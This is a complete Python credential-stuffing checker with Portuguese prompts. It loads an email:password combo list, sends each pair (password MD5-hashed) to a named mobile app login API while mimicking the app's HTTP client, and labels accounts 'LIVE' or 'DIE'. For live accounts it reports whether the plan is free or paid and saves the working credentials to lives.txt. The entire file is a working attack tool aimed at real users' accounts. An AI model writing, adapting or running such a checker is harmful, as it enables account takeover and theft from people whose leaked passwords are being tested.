import requests
import re
import hashlib
from colored import fg, attr

# Get input file path from user
input_file = input("Digite a DB email:senha: ")

# Read email:password pairs from the input file
with open(input_file, "r") as f:
    lines = f.readlines()

line_counter = 1

# Loop through each email:password pair
for line in lines:
    email, password = line.strip().split(":")

    # Calculate MD5 hash of the password
    password_hash = hashlib.md5(password.encode()).hexdigest()

    # Perform the login request
    try:
        response = requests.post("http://mobileauth.vmfc.host:9770/api/uc/login4app/v1", data={
            "email": email,
            "password": password_hash
        }, headers={
            "Content-Length": "2959",
            "Host": "mobileauth.vmfc.host:9770",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.14.4"
        })

        # Check if login was successful or failed
        if any(keyword in response.text for keyword in ["Account card and password not match.",
                                                         "Email does not exist.",
                                                         "Account not registered",
                                                         "Account not activated",
                                                         "Account and password do not match",
                                                         "Login ID is empty or invalid"]):
            print(f"{fg(1)}DIE{attr(0)} - Linha {line_counter}: {fg(1)}{email}:{password}{fg(0)}")
        elif "success\":true" in response.text:
            print(f"{fg(2)}LIVE{attr(0)} - Linha {line_counter}: {fg(2)}{email}:{password}{fg(0)}")

            # Check if the account is on a free plan or paid plan
            if any(keyword in response.text for keyword in ["Avaliação gratuita"]):
                print(f"{fg(1)}PLANO FREE {fg(0)}❌")
            else:
                print(f"{fg(2)}PLANO PAGO{fg(0)} 💳")

            with open("lives.txt", "a") as f:
                f.write(f"{email}:{password}\n")
        else:
            print(f"{fg(3)}ERRO DESCONHECIDO 👁️ {attr(0)} - Line {line_counter}: {email}:{password}")
    except requests.exceptions.RequestException as e:
        print(f"{fg(1)}ERRO NA CONEXÃO 🌐{attr(0)} - Line {line_counter}: {email}:{password} - {e}")

    line_counter += 1